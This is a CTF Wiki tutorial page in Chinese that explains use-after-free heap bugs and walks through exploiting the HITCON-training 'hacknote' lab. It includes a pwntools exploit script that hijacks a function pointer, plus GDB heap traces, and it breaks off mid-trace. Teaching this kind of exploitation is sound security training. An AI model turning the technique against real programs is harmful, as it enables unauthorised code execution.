


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="zh_CN">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Use After Free &#8212; CTF Wiki </title>
    <link rel="stylesheet" href="../../_static/cloud.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noticia+Text|Open+Sans|Droid+Sans+Mono" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '../../',
        VERSION:     '',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="../../_static/jquery.js"></script>
    <script type="text/javascript" src="../../_static/underscore.js"></script>
    <script type="text/javascript" src="../../_static/doctools.js"></script>
    <script type="text/javascript" src="../../_static/translations.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript" src="../../_static/jquery.cookie.js"></script>
    <script type="text/javascript" src="../../_static/cloud.base.js"></script>
    <script type="text/javascript" src="../../_static/cloud.js"></script>
    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
    <link rel="search" title="搜索" href="../../search.html" />
    <link rel="next" title="Fastbin Attack" href="fastbin_attack.html" />
    <link rel="prev" title="Unlink" href="unlink.html" /> 
        <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="relbar-top">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             accesskey="C">toc</a></li>
        <li class="right" >
          <a href="fastbin_attack.html" title="Fastbin Attack"
             accesskey="N">下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="unlink.html" title="Unlink"
             accesskey="P">上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>
  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="use-after-free">
<h1>Use After Free<a class="headerlink" href="#use-after-free" title="永久链接至标题">¶</a></h1>
<div class="section" id="id1">
<h2>原理<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul class="simple">
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong></p>
<p>这里给出一个简单的例子</p>
<div class="code cpp highlight-default"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="n">typedef</span> <span class="n">struct</span> <span class="n">name</span> <span class="p">{</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">myname</span><span class="p">;</span>
  <span class="n">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="n">char</span> <span class="o">*</span><span class="nb">str</span><span class="p">);</span>
<span class="p">}</span> <span class="n">NAME</span><span class="p">;</span>
<span class="n">void</span> <span class="n">myprint</span><span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">);</span> <span class="p">}</span>
<span class="n">void</span> <span class="n">printmyname</span><span class="p">()</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;call print my name</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">NAME</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">NAME</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">sizeof</span><span class="p">(</span><span class="n">struct</span> <span class="n">name</span><span class="p">));</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">myprint</span><span class="p">;</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">myname</span> <span class="o">=</span> <span class="s2">&quot;I can also use it&quot;</span><span class="p">;</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s2">&quot;this is my function&quot;</span><span class="p">);</span>
  <span class="o">//</span> <span class="n">free</span> <span class="n">without</span> <span class="n">modify</span>
  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s2">&quot;I can also use it&quot;</span><span class="p">);</span>
  <span class="o">//</span> <span class="n">free</span> <span class="k">with</span> <span class="n">modify</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">printmyname</span><span class="p">;</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s2">&quot;this is my function&quot;</span><span class="p">);</span>
  <span class="o">//</span> <span class="nb">set</span> <span class="n">NULL</span>
  <span class="n">a</span> <span class="o">=</span> <span class="n">NULL</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;this pogram will crash...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s2">&quot;can not be printed...&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>运行结果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  use_after_free git:(use_after_free) ✗ ./use_after_free
this is my function
I can also use it
call print my name
this pogram will crash...
[1]    38738 segmentation fault (core dumped)  ./use_after_free
</pre></div>
</div>
</div>
<div class="section" id="id2">
<h2>例子<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
<p>这里我们以 HITCON-training 中的 lab 10 hacknote为例。</p>
<div class="section" id="id3">
<h3>功能分析<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
<p>我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">puts</span><span class="p">(</span><span class="s2">&quot; 1. Add note          &quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot; 2. Delete note       &quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot; 3. Print note        &quot;</span><span class="p">);</span>
<span class="n">puts</span><span class="p">(</span><span class="s2">&quot; 4. Exit              &quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。</p>
<div class="section" id="add-note">
<h4>add_note<a class="headerlink" href="#add-note" title="永久链接至标题">¶</a></h4>
<p>根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。</p>
<div class="code cpp highlight-default"><div class="highlight"><pre><span></span>unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count &lt;= 5 )
  {
    for ( i = 0; i &lt;= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts(&quot;Alloca Error&quot;);
          exit(-1);
        }
        notelist[i]-&gt;put = print_note_content;
        printf(&quot;Note size :&quot;);
        read(0, &amp;buf, 8u);
        size = atoi(&amp;buf);
        v0 = notelist[i];
        v0-&gt;content = malloc(size);
        if ( !notelist[i]-&gt;content )
        {
          puts(&quot;Alloca Error&quot;);
          exit(-1);
        }
        printf(&quot;Content :&quot;);
        read(0, notelist[i]-&gt;content, size);
        puts(&quot;Success !&quot;);
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts(&quot;Full&quot;);
  }
  return __readgsdword(0x14u) ^ v5;
}
</pre></div>
</div>
</div>
<div class="section" id="print-note">
<h4>print_note<a class="headerlink" href="#print-note" title="永久链接至标题">¶</a></h4>
<p>print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">print_note</span><span class="p">()</span>
<span class="p">{</span>
  <span class="nb">int</span> <span class="n">v1</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
  <span class="n">char</span> <span class="n">buf</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index :&quot;</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="n">u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Out of bound!&quot;</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
    <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="delete-note">
<h4>delete_note<a class="headerlink" href="#delete-note" title="永久链接至标题">¶</a></h4>
<p>delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">del_note</span><span class="p">()</span>
<span class="p">{</span>
  <span class="nb">int</span> <span class="n">v1</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
  <span class="n">char</span> <span class="n">buf</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Index :&quot;</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="n">u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">count</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Out of bound!&quot;</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">notelist</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Success&quot;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id4">
<h3>利用分析<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h3>
<p>我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free
来使得这个程序执行magic函数呢？<strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？</p>
<p>我们可以简单来看一下每一个note生成的具体流程</p>
<ol class="arabic">
<li><p class="first">程序申请8字节内存用来存放note中的put以及content指针。</p>
</li>
<li><p class="first">程序根据输入的size来申请指定大小的内存，然后用来存储content。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">+-----------------+</span>
<span class="o">|</span>   <span class="n">put</span>           <span class="o">|</span>
<span class="o">+-----------------+</span>
<span class="o">|</span>   <span class="n">content</span>       <span class="o">|</span>       <span class="n">size</span>
<span class="o">+-----------------+-------------------&gt;+----------------+</span>
                                       <span class="o">|</span>     <span class="n">real</span>       <span class="o">|</span>
                                       <span class="o">|</span>    <span class="n">content</span>     <span class="o">|</span>
                                       <span class="o">|</span>                <span class="o">|</span>
                                       <span class="o">+----------------+</span>
</pre></div>
</div>
</li>
</ol>
<p>那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin
chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real
content的时候来进行覆盖。具体采用的思路如下</p>
<ul class="simple">
<li>申请note0，real content size为16（大小与note大小所在的bin不一样即可）</li>
<li>申请note1，real content size为16（大小与note大小所在的bin不一样即可）</li>
<li>释放note0</li>
<li>释放note1</li>
<li>此时，大小为16的fast bin chunk中链表为note1-&gt;note0</li>
<li>申请note2，并且设置real content的大小为8，那么根据堆的分配规则<ul>
<li>note2其实会分配note1对应的内存块。</li>
<li>real content 对应的chunk其实是note0。</li>
</ul>
</li>
<li>如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。</li>
</ul>
</div>
<div class="section" id="id5">
<h3>利用脚本<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./hacknote&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">addnote</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">printnote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="c1">#gdb.attach(r)</span>
<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x08048986</span>

<span class="n">addnote</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;aaaa&quot;</span><span class="p">)</span> <span class="c1"># add note 0</span>
<span class="n">addnote</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="s2">&quot;ddaa&quot;</span><span class="p">)</span> <span class="c1"># add note 1</span>

<span class="n">delnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># delete note 0</span>
<span class="n">delnote</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># delete note 1</span>

<span class="n">addnote</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span> <span class="c1"># add note 2</span>

<span class="n">printnote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># print note 0</span>

<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>我们可以具体看一下执行的流程，首先先下断点</p>
<p><strong>两处malloc下断点</strong></p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>gef➤  b *0x0804875C
Breakpoint 1 at 0x804875c
gef➤  b *0x080486CA
Breakpoint 2 at 0x80486ca
</pre></div>
</div>
<p><strong>两处free下断点</strong></p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>gef➤  b *0x08048893
Breakpoint 3 at 0x8048893
gef➤  b *0x080488A9
Breakpoint 4 at 0x80488a9
</pre></div>
</div>
<p>然后继续执行程序，可以看出申请note0时，所申请到的内存块地址为0x0804b008。（eax存储函数返回值）</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>$eax   : 0x0804b008  →  0x00000000
$ebx   : 0x00000000
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b008  →  0x00000000
$esp   : 0xffffcf10  →  0x00000008
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x080486cf  →  &lt;add_note+89&gt; add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x80486c2 &lt;add_note+76&gt;    add    DWORD PTR [eax], eax
    0x80486c4 &lt;add_note+78&gt;    add    BYTE PTR [ebx+0x86a0cec], al
    0x80486ca &lt;add_note+84&gt;    call   0x80484e0 &lt;malloc@plt&gt;
 →  0x80486cf &lt;add_note+89&gt;    add    esp, 0x10
    0x80486d2 &lt;add_note+92&gt;    mov    edx, eax
    0x80486d4 &lt;add_note+94&gt;    mov    eax, DWORD PTR [ebp-0x1c]
    0x80486d7 &lt;add_note+97&gt;    mov    DWORD PTR [eax*4+0x804a070], edx
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
[&#39;0xffffcf10&#39;, &#39;l8&#39;]
8
0xffffcf10│+0x00: 0x00000008     ← $esp
0xffffcf14│+0x04: 0x00000000
0xffffcf18│+0x08: 0xf7e29ef5  →  &lt;strtol+5&gt; add eax, 0x18210b
0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
[#0] 0x80486cf → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b008
UsedChunk(addr=0x804b008, size=0x10)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
</pre></div>
</div>
<p><strong>申请note 0的content的地址为0x0804b018</strong></p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>$eax   : 0x0804b018  →  0x00000000
$ebx   : 0x0804b008  →  0x0804865b  →  &lt;print_note_content+0&gt; push ebp
$ecx   : 0xf7fac780  →  0x00000000
$edx   : 0x0804b018  →  0x00000000
$esp   : 0xffffcf10  →  0x00000020
$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xf7fac000  →  0x001b1db0
$eip   : 0x08048761  →  &lt;add_note+235&gt; add esp, 0x10
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
    0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804
    0x8048757 &lt;add_note+225&gt;   call   0x581173df
    0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;
 →  0x8048761 &lt;add_note+235&gt;   add    esp, 0x10
    0x8048764 &lt;add_note+238&gt;   mov    DWORD PTR [ebx+0x4], eax
    0x8048767 &lt;add_note+241&gt;   mov    eax, DWORD PTR [ebp-0x1c]
    0x804876a &lt;add_note+244&gt;   mov    eax, DWORD PTR [eax*4+0x804a070]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
[&#39;0xffffcf10&#39;, &#39;l8&#39;]
8
0xffffcf10│+0x00: 0x00000020     ← $esp
0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233
0xffffcf18│+0x08: 0x00000008
0xffffcf1c│+0x0c: 0xf7e27260  →  &lt;atoi+16&gt; add esp, 0x1c
0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000
0xffffcf24│+0x14: 0x00000000
0xffffcf28│+0x18: 0x0000000a
0xffffcf2c│+0x1c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
[#0] 0x8048761 → Name: add_note()
[#1] 0x8048ac5 → Name: main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap chunk 0x0804b018
UsedChunk(addr=0x804b018, size=0x28)
Chunk size: 40 (0x28)
Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
</pre></div>
</div>
<p>类似的，我们可以得到note1的地址以及其content的地址分别为0x0804b040 和0x0804b050。</p>
<p>同时，我们还可以看到note0与note1对应的content确实是相应的内存块。</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  grep aaaa
[+] Searching &#39;aaaa&#39; in memory
[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission=rw-
  0x804b018 - 0x804b01c  →   &quot;aaaa&quot;
gef➤  grep ddaa
[+] Searching &#39;ddaa&#39; in memory
[+] In &#39;[heap]&#39;(0x804b000-0x806c000), permission=rw-
  0x804b050 - 0x804b054  →   &quot;ddaa&quot;
</pre></div>
</div>
<p>下面就是free的过程了。我们可以依次发现首先，note0的content被free</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span> →  0x8048893 &lt;del_note+143&gt;   call   0x80484c0 &lt;free@plt&gt;
   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018
       0x80484c6 &lt;free@plt+6&gt;     push   0x18
       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480
       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
[&#39;0xffffcf20&#39;, &#39;l8&#39;]
8
0xffffcf20│+0x00: 0x0804b018  →  &quot;aaaa&quot;  ← $esp
</pre></div>
</div>
<p>然后是note0本身</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span> →  0x80488a9 &lt;del_note+165&gt;   call   0x80484c0 &lt;free@plt&gt;
   ↳   0x80484c0 &lt;free@plt+0&gt;     jmp    DWORD PTR ds:0x804a018
       0x80484c6 &lt;free@plt+6&gt;     push   0x18
       0x80484cb &lt;free@plt+11&gt;    jmp    0x8048480
       0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp    DWORD PTR ds:0x804a01c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
[&#39;0xffffcf20&#39;, &#39;l8&#39;]
